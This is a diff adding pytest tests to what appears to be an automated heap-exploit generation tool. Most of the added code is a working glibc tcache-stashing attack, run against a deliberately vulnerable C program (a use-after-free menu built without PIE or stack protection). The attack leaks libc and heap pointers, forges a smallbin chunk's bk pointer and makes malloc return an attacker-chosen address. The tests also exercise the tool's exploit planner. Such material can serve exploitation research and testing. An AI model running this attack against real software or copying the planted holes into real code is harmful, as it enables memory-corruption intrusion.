@@ -297,3 +297,198 @@ int main(void){ setvbuf(stdout,0,2,0);
     assert b"nextsize" in out1, out1[-120:]
     seeded, _ = attempt(True)
     assert seeded == "wrote", f"with the guard satisfied the write must land, got {seeded!r}"
+
+
+# --- tcache stashing: the unlink glibc still does not check --------------------------------------
+
+def test_guard_sites_is_the_shared_way_to_ask():
+    """Every allocator-hardening question here is answered by counting the jumps that reach a
+    check's error string -- no version table, nothing that depends on register allocation."""
+    if not _SYS_LIBC:
+        pytest.skip("no system libc")
+    d = open(_SYS_LIBC, "rb").read()
+    assert heap.guard_sites(d, b"malloc(): smallbin double linked list corrupted\x00") == 1
+    assert heap.guard_sites(d, b"malloc(): no such message in any libc\x00") is None
+
+
+def test_tcache_capacity_is_measured_not_assumed():
+    """The textbook 7 is wrong on current glibc, so the number is measured. It must also be
+    stable: a flaky answer would silently break every fill recipe."""
+    runs = {heap.tcache_capacity(chunk_size=0x90) for _ in range(3)}
+    cap = runs.pop()
+    assert not runs, "the capacity probe disagreed with itself across runs"
+    if cap is None:
+        pytest.skip("no compiler to measure with")
+    assert cap >= 7
+    # The probe must not be fooled by `tcache_key`, which is a full-width random word and passes
+    # any "looks like a libc pointer" threshold -- it calibrates on the first entry's key instead.
+    assert cap == heap.tcache_capacity(chunk_size=0xA0)
+
+
+def test_tcache_bypass_allocators_is_measured():
+    """Which allocator reaches _int_malloc without consulting the tcache decides the stashing
+    attack's trigger, and it is the detail every published recipe gets wrong on current glibc:
+    they all use calloc."""
+    b = heap.tcache_bypass_allocators()
+    if not b.get("measured"):
+        pytest.skip("no compiler to measure with")
+    assert set(b) >= {"calloc", "memalign", "realloc"}
+    assert any(b[k] for k in ("calloc", "memalign", "realloc")), \
+        "if nothing bypasses the tcache the attack has no trigger at all -- say so loudly"
+
+
+def test_smallbin_stash_guard_says_whether_the_attack_exists():
+    if not _SYS_LIBC:
+        pytest.skip("no system libc")
+    g = heap.smallbin_stash_guard(open(_SYS_LIBC, "rb").read())
+    assert g["sites"] in (0, 1, 2)
+    assert g["unchecked"] is (g["sites"] < 2)
+    assert g["glibc"] != "?" and g["reason"]
+
+
+def test_smallbin_index_and_head():
+    assert heap.smallbin_index(0x90) == 9
+    assert heap.small_bin_bin_head(0x1E7AC8, 0x90) == 0x1E7AC8 + 8 * 0x10
+
+
+def test_aaheg_tcache_stashing_carries_the_measured_numbers():
+    """The emitted chain must contain what was measured here, not the recipe's constants."""
+    if not _SYS_LIBC:
+        pytest.skip("no system libc")
+    ld = open(_SYS_LIBC, "rb").read()
+    r = aaheg.plan_exploit(aaheg.Vuln("uaf", size=0x88), aaheg.Goal("arbitrary_alloc"),
+                           aaheg.Env(glibc=(2, 43), libc_data=ld))
+    e = next(a for a in r["advisory_alternatives"] if a["technique"] == "tcache_stashing")
+    cap = heap.tcache_capacity() or heap.TCACHE_COUNT
+    notes = " ".join((s.get("detail") or s.get("note") or "") for s in e["steps"])
+    assert f"measured: {cap}" in notes
+    assert "16-aligned" in " ".join(e["preconditions"])
+    blind = aaheg.plan_exploit(aaheg.Vuln("uaf", size=0x88), aaheg.Goal("arbitrary_alloc"),
+                               aaheg.Env(glibc=(2, 43)))
+    be = next(a for a in blind["advisory_alternatives"] if a["technique"] == "tcache_stashing")
+    assert "unverified" in be["primitive"] and e["primitive"] != be["primitive"]
+
+
+_STASH_MENU = r'''#include <stdio.h>
+#include <stdlib.h>
+#define N 256
+static char *slot[N];
+static size_t len[N];
+static long rd(void){ long v; if(scanf("%ld",&v)!=1) exit(0); return v; }
+int main(void){
+  setvbuf(stdout,0,2,0);
+  for(;;){
+    printf("1.malloc 2.calloc 3.free 4.view 5.edit 6.probe 7.exit\n> ");
+    long o = rd();
+    if(o==1||o==2){ printf("idx: "); long i=rd(); printf("size: "); long s=rd();
+      if(i<0||i>=N||s<0x18||s>0x2000){ printf("bad\n"); continue; }
+      slot[i] = (o==1) ? malloc(s) : calloc(1,s); len[i]=s; printf("ok\n"); }
+    else if(o==3){ printf("idx: "); long i=rd(); if(i<0||i>=N) continue;
+      free(slot[i]); printf("ok\n"); }
+    else if(o==4){ printf("idx: "); long i=rd(); if(i<0||i>=N||!slot[i]) continue;
+      printf("data: "); fwrite(slot[i],1,len[i],stdout); printf("\n"); }
+    else if(o==5){ printf("idx: "); long i=rd(); if(i<0||i>=N||!slot[i]) continue;
+      printf("data: "); getchar();
+      if(fread(slot[i],1,len[i],stdin)!=len[i]) exit(0); printf("ok\n"); }
+    else return 0; }
+}
+'''
+
+
+def _is_libc_ptr(x):
+    """A libc pointer is 0x00007fxx_xxxxxxxx. Bound it ABOVE as well: `tcache_key` is a
+    full-width random word and a bare `> 0x7f0000000000` test matches it, which is how a tcache
+    entry gets mistaken for a chunk sitting in a bin."""
+    return 0x7F0000000000 < x < 0x800000000000
+
+
+def test_tcache_stashing_makes_malloc_return_a_chosen_address(tmp_path):
+    """The live measurement behind the stated primitive: corrupt the to-be-stashed chunk's `bk`
+    and the next allocation of that size comes back at an address we picked."""
+    from lykos.analyze.dynamic import sandbox
+    if sandbox.host_arch() != "x86-64" or not _SYS_LIBC:
+        pytest.skip("x86-64 + system libc required")
+    gcc = shutil.which("gcc") or shutil.which("cc")
+    if not gcc:
+        pytest.skip("no C compiler")
+    g = heap.smallbin_stash_guard(open(_SYS_LIBC, "rb").read())
+    if not g["unchecked"]:
+        pytest.skip(f"the stashing unlink is checked on this libc ({g['reason']})")
+    cap = heap.tcache_capacity(chunk_size=0x90)
+    unsorted = heap.unsorted_bin_offset(_SYS_LIBC)
+    if not (cap and unsorted):
+        pytest.skip("could not measure the tcache capacity / main_arena offset")
+    (tmp_path / "t.c").write_text(_STASH_MENU)
+    exe = tmp_path / "nb"
+    if subprocess.run([gcc, "-no-pie", "-fno-stack-protector", "-O0", "-w", str(tmp_path / "t.c"),
+                       "-o", str(exe)], capture_output=True).returncode:
+        pytest.skip("build failed")
+
+    S, BIG, HOST = 0x88, 0x1800, 0x3F8
+    p = subprocess.Popen([str(exe)], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+                         stderr=subprocess.STDOUT, start_new_session=True)
+    PROMPT = b"7.exit\n> "
+
+    def op(seq, secs=4.0):
+        assert p.poll() is None, f"target exited rc={p.poll()}"
+        p.stdin.write(seq)
+        p.stdin.flush()
+        out, end = b"", time.time() + secs
+        while time.time() < end:
+            if select.select([p.stdout], [], [], 0.05)[0]:
+                b = p.stdout.read1(1 << 20)
+                if not b:
+                    break
+                out += b
+                if out.endswith(PROMPT):
+                    break
+        return out
+
+    def words(i, n=2):
+        parts = op(b"4\n%d\n" % i).split(b"data: ", 1)
+        if len(parts) < 2:
+            return []
+        return [struct.unpack("<Q", parts[1][o:o + 8])[0] for o in range(0, 8 * n, 8)]
+
+    try:
+        op(b"\n")
+        HOSTSLOT, NV = 250, cap + 2
+        op(b"1\n%d\n%d\n" % (HOSTSLOT, HOST))
+        for k in range(NV):
+            op(b"1\n%d\n%d\n" % (k, S))
+            op(b"1\n%d\n%d\n" % (100 + k, S))        # a guard after each
+        for k in range(NV):
+            op(b"3\n%d\n" % k)
+        op(b"1\n200\n%d\n" % BIG)                    # sorts the two spilled chunks into smallbin 9
+        A, B = NV - 2, NV - 1
+        wa, wb = words(A), words(B)
+        assert _is_libc_ptr(wa[1]) != _is_libc_ptr(wb[1]), [hex(x) for x in wa + wb]
+        stash = A if _is_libc_ptr(wa[1]) else B
+        bin_head = wa[1] if _is_libc_ptr(wa[1]) else wb[1]
+        # The bin head must be smallbin 9's, which also proves they are not still unsorted.
+        base = bin_head - heap.small_bin_bin_head(unsorted, 0x90)
+        assert base % 0x1000 == 0, f"bin head {bin_head:#x} is not smallbin 9's"
+
+        def heap_ptr(ws):
+            return next(x for x in ws if 0 < x < 0x7F0000000000)
+
+        chunk_A = heap_ptr(wb)
+        host_data = chunk_A - A * 0x120 - 0x400 + 0x10
+        TARGET = host_data + 0x40
+        seed = bytearray(HOST)
+        seed[0x48:0x50] = struct.pack("<Q", bin_head)   # the fake chunk's bk: terminate the loop
+        op(b"5\n%d\n" % HOSTSLOT + bytes(seed))
+        cur = words(stash)
+        op(b"5\n%d\n" % stash + struct.pack("<QQ", cur[0], TARGET - 0x10).ljust(S, b"\x00"))
+        for k in range(cap):                            # the smallbin path needs an EMPTY tcache
+            op(b"1\n%d\n%d\n" % (150 + k, S))
+        out = op(b"1\n180\n%d\n" % S)                   # guarded unlink, then the stashing loop
+        assert b"corrupted" not in out and p.poll() is None, out[-120:]
+        op(b"1\n181\n%d\n" % S)                         # and THIS one returns TARGET
+        op(b"5\n181\n" + b"STASHED!".ljust(S, b"\x00"))
+        hw = words(HOSTSLOT, 12)
+        assert len(hw) >= 9, hw
+        assert hw[8] == struct.unpack("<Q", b"STASHED!")[0], \
+            f"malloc did not return TARGET: *TARGET = {hw[8]:#x}"
+    finally:
+        sandbox.kill_quietly(p)
